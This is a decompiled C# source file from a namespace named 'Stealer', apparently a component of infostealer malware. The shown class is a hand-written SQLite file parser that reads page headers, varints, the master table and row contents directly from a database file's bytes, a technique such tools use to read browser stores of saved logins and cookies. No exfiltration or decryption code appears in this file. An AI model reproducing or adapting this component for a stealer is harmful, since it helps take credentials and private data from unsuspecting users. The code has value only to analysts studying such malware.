using System;
using System.IO;
using System.Text;

namespace Stealer
{
	// Token: 0x0200001B RID: 27
	internal class SQL
	{
		// Token: 0x06000079 RID: 121 RVA: 0x00009658 File Offset: 0x00007858
		public SQL(string fileName)
		{
			this._fileBytes = File.ReadAllBytes(fileName);
			this._pageSize = this.ConvertToULong(16, 2);
			this._dbEncoding = this.ConvertToULong(56, 4);
			this.ReadMasterTable(100L);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x000096BC File Offset: 0x000078BC
		private ulong ConvertToULong(int startIndex, int size)
		{
			ulong result;
			try
			{
				bool flag = size > 8 | size == 0;
				if (flag)
				{
					result = 0UL;
				}
				else
				{
					ulong num = 0UL;
					for (int i = 0; i <= size - 1; i++)
					{
						num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
					}
					result = num;
				}
			}
			catch
			{
				result = 0UL;
			}
			return result;
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00009728 File Offset: 0x00007928
		private long Cvl(int startIdx, int endIdx)
		{
			long result;
			try
			{
				endIdx++;
				byte[] array = new byte[8];
				int num = endIdx - startIdx;
				bool flag = false;
				bool flag2 = num == 0 | num > 9;
				if (flag2)
				{
					result = 0L;
				}
				else
				{
					bool flag3 = num == 1;
					if (flag3)
					{
						array[0] = (this._fileBytes[startIdx] & 127);
						result = BitConverter.ToInt64(array, 0);
					}
					else
					{
						bool flag4 = num == 9;
						if (flag4)
						{
							flag = true;
						}
						int num2 = 1;
						int num3 = 7;
						int num4 = 0;
						bool flag5 = flag;
						if (flag5)
						{
							array[0] = this._fileBytes[endIdx - 1];
							endIdx--;
							num4 = 1;
						}
						for (int i = endIdx - 1; i >= startIdx; i += -1)
						{
							bool flag6 = i - 1 >= startIdx;
							if (flag6)
							{
								array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
								num2++;
								num4++;
								num3--;
							}
							else
							{
								bool flag7 = !flag;
								if (flag7)
								{
									array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
								}
							}
						}
						result = BitConverter.ToInt64(array, 0);
					}
				}
			}
			catch
			{
				result = 0L;
			}
			return result;
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00009898 File Offset: 0x00007A98
		public int GetRowCount()
		{
			return this._tableEntries.Length;
		}

		// Token: 0x0600007D RID: 125 RVA: 0x000098B4 File Offset: 0x00007AB4
		public string GetValue(int rowNum, int field)
		{
			string result;
			try
			{
				bool flag = rowNum >= this._tableEntries.Length;
				if (flag)
				{
					result = null;
				}
				else
				{
					result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00009920 File Offset: 0x00007B20
		private int Gvl(int startIdx)
		{
			int result;
			try
			{
				bool flag = startIdx > this._fileBytes.Length;
				if (flag)
				{
					return 0;
				}
				for (int i = startIdx; i <= startIdx + 8; i++)
				{
					bool flag2 = i > this._fileBytes.Length - 1;
					if (flag2)
					{
						return 0;
					}
					bool flag3 = (this._fileBytes[i] & 128) != 128;
					if (flag3)
					{
						result = i;
						goto IL_7B;
					}
				}
				return startIdx + 8;
			}
			catch
			{
				result = 0;
			}
			IL_7B:
			return result;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000099C0 File Offset: 0x00007BC0
		private static bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x000099DC File Offset: 0x00007BDC
		private void ReadMasterTable(long offset)
		{
			try
			{
				byte b = this._fileBytes[(int)((IntPtr)offset)];
				byte b2 = b;
				if (b2 != 5)
				{
					if (b2 == 13)
					{
						ulong num = this.ConvertToULong((int)offset + 3, 2) - 1UL;
						int num2 = 0;
						bool flag = this._masterTableEntries != null;
						if (flag)
						{
							num2 = this._masterTableEntries.Length;
							Array.Resize<SQL.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
						}
						else
						{
							this._masterTableEntries = new SQL.SqliteMasterEntry[num + 1UL];
						}
						for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
						{
							ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
							bool flag2 = offset != 100L;
							if (flag2)
							{
								num4 += (ulong)offset;
							}
							int num5 = this.Gvl((int)num4);
							this.Cvl((int)num4, num5);
							int num6 = this.Gvl((int)(num4 + ((double)num5 - num4) + 1.0));
							this.Cvl((int)(num4 + ((double)num5 - num4) + 1.0), num6);
							ulong num7 = (ulong)(num4 + ((double)num6 - num4 + 1.0));
							int num8 = this.Gvl((int)num7);
							int num9 = num8;
							long num10 = this.Cvl((int)num7, num8);
							long[] array = new long[5];
							for (int i = 0; i <= 4; i++)
							{
								int startIdx = num9 + 1;
								num9 = this.Gvl(startIdx);
								array[i] = this.Cvl(startIdx, num9);
								array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)((IntPtr)array[i])]) : ((ulong)((!SQL.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
							}
							bool flag3 = this._dbEncoding != 1UL;
							if (flag3)
							{
							}
							bool flag4 = this._dbEncoding == 1UL;
							if (flag4)
							{
								this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
							}
							else
							{
								bool flag5 = this._dbEncoding == 2UL;
								if (flag5)
								{
									this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
								}
								else
								{
									bool flag6 = this._dbEncoding == 3UL;
									if (flag6)
									{
										this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									}
								}
							}
							this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
							bool flag7 = this._dbEncoding == 1UL;
							if (flag7)
							{
								this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
							else
							{
								bool flag8 = this._dbEncoding == 2UL;
								if (flag8)
								{
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
								}
								else
								{
									bool flag9 = this._dbEncoding == 3UL;
									if (flag9)
									{
										this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
									}
								}
							}
						}
					}
				}
				else
				{
					ushort num11 = (ushort)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
					for (int j = 0; j <= (int)num11; j++)
					{
						ushort num12 = (ushort)this.ConvertToULong((int)offset + 12 + j * 2, 2);
						bool flag10 = offset == 100L;
						if (flag10)
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)num12, 4) - 1UL) * this._pageSize));
						}
						else
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num12)), 4) - 1UL) * this._pageSize));
						}
					}
					this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1UL) * this._pageSize));
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00009EE4 File Offset: 0x000080E4
		public bool ReadTable(string tableName)
		{
			bool result;
			try
			{
				int num = -1;
				int i = 0;
				while (i <= this._masterTableEntries.Length)
				{
					bool flag = string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0;
					if (flag)
					{
						num = i;
						IL_55:
						bool flag2 = num == -1;
						if (flag2)
						{
							return false;
						}
						char[] separator = new char[]
						{
							','
						};
						string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(separator);
						for (int j = 0; j <= array.Length - 1; j++)
						{
							array[j] = array[j].TrimStart(new char[0]);
							int num2 = array[j].IndexOf(' ');
							bool flag3 = num2 > 0;
							if (flag3)
							{
								array[j] = array[j].Substring(0, num2);
							}
							bool flag4 = array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0;
							if (flag4)
							{
								Array.Resize<string>(ref this._fieldNames, j + 1);
								this._fieldNames[j] = array[j];
							}
						}
						return this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
					}
					else
					{
						i++;
					}
				}
				goto IL_55;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x0000A084 File Offset: 0x00008284
		private bool ReadTableFromOffset(ulong offset)
		{
			bool result;
			try
			{
				bool flag = this._fileBytes[(int)((IntPtr)((long)offset))] == 13;
				if (flag)
				{
					ushort num = (ushort)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
					int num2 = 0;
					bool flag2 = this._tableEntries != null;
					if (flag2)
					{
						num2 = this._tableEntries.Length;
						Array.Resize<SQL.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
					}
					else
					{
						this._tableEntries = new SQL.TableEntry[(int)(num + 1)];
					}
					ushort num3 = num;
					ushort num4 = 0;
					for (ushort num5 = 0; num5 <= num; num5 += 1)
					{
						bool flag3 = num3 == num;
						if (flag3)
						{
							num4 += 1;
						}
						bool flag4 = num4 > 100;
						if (flag4)
						{
							return false;
						}
						ulong num6 = this.ConvertToULong((int)offset + 8 + (int)(num5 * 2), 2);
						bool flag5 = offset != 100UL;
						if (flag5)
						{
							num6 += offset;
						}
						int num7 = this.Gvl((int)num6);
						this.Cvl((int)num6, num7);
						int num8 = this.Gvl((int)(num6 + ((double)num7 - num6) + 1.0));
						this.Cvl((int)(num6 + ((double)num7 - num6) + 1.0), num8);
						ulong num9 = (ulong)(num6 + ((double)num8 - num6 + 1.0));
						int num10 = this.Gvl((int)num9);
						int num11 = num10;
						long num12 = this.Cvl((int)num9, num10);
						SQL.RecordHeaderField[] array = null;
						long num13 = (long)(num9 - (ulong)((long)num10) + 1UL);
						int num14 = 0;
						while (num13 < num12)
						{
							Array.Resize<SQL.RecordHeaderField>(ref array, num14 + 1);
							int num15 = num11 + 1;
							num11 = this.Gvl(num15);
							array[num14].Type = this.Cvl(num15, num11);
							array[num14].Size = (long)((array[num14].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)((IntPtr)array[num14].Type)]) : ((ulong)((!SQL.IsOdd(array[num14].Type)) ? ((array[num14].Type - 12L) / 2L) : ((array[num14].Type - 13L) / 2L))));
							num13 = num13 + (long)(num11 - num15) + 1L;
							num14++;
						}
						bool flag6 = array != null;
						if (flag6)
						{
							this._tableEntries[num2 + (int)num5].Content = new string[array.Length];
							int num16 = 0;
							for (int i = 0; i <= array.Length - 1; i++)
							{
								bool flag7 = array[i].Type > 9L;
								if (flag7)
								{
									bool flag8 = !SQL.IsOdd(array[i].Type);
									if (flag8)
									{
										bool flag9 = this._dbEncoding == 1UL;
										if (flag9)
										{
											this._tableEntries[num2 + (int)num5].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num9 + (ulong)num12) + num16, (int)array[i].Size);
										}
										else
										{
											bool flag10 = this._dbEncoding == 2UL;
											if (flag10)
											{
												this._tableEntries[num2 + (int)num5].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num9 + (ulong)num12) + num16, (int)array[i].Size);
											}
											else
											{
												bool flag11 = this._dbEncoding == 3UL;
												if (flag11)
												{
													this._tableEntries[num2 + (int)num5].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num9 + (ulong)num12) + num16, (int)array[i].Size);
												}
											}
										}
									}
									else
									{
										this._tableEntries[num2 + (int)num5].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num9 + (ulong)num12) + num16, (int)array[i].Size);
									}
								}
								else
								{
									this._tableEntries[num2 + (int)num5].Content[i] = Convert.ToString(this.ConvertToULong((int)(num9 + (ulong)num12) + num16, (int)array[i].Size));
								}
								num16 += (int)array[i].Size;
							}
						}
					}
				}
				else
				{
					bool flag12 = this._fileBytes[(int)((IntPtr)((long)offset))] == 5;
					if (flag12)
					{
						ushort num17 = (ushort)(this.ConvertToULong((int)(offset + 3UL), 2) - 1UL);
						for (ushort num18 = 0; num18 <= num17; num18 += 1)
						{
							ushort num19 = (ushort)this.ConvertToULong((int)offset + 12 + (int)(num18 * 2), 2);
							this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num19), 4) - 1UL) * this._pageSize);
						}
						this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8UL), 4) - 1UL) * this._pageSize);
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x04000014 RID: 20
		private readonly ulong _dbEncoding;

		// Token: 0x04000015 RID: 21
		private string[] _fieldNames;

		// Token: 0x04000016 RID: 22
		private readonly byte[] _fileBytes;

		// Token: 0x04000017 RID: 23
		private SQL.SqliteMasterEntry[] _masterTableEntries;

		// Token: 0x04000018 RID: 24
		private readonly ulong _pageSize;

		// Token: 0x04000019 RID: 25
		private readonly byte[] _sqlDataTypeSize = new byte[]
		{
			0,
			1,
			2,
			3,
			4,
			6,
			8,
			8,
			0,
			0
		};

		// Token: 0x0400001A RID: 26
		private SQL.TableEntry[] _tableEntries;

		// Token: 0x0200002C RID: 44
		private struct RecordHeaderField
		{
			// Token: 0x04000045 RID: 69
			public long Size;

			// Token: 0x04000046 RID: 70
			public long Type;
		}

		// Token: 0x0200002D RID: 45
		private struct SqliteMasterEntry
		{
			// Token: 0x04000047 RID: 71
			public string ItemName;

			// Token: 0x04000048 RID: 72
			public long RootNum;

			// Token: 0x04000049 RID: 73
			public string SqlStatement;
		}

		// Token: 0x0200002E RID: 46
		private struct TableEntry
		{
			// Token: 0x0400004A RID: 74
			public string[] Content;
		}
	}
}
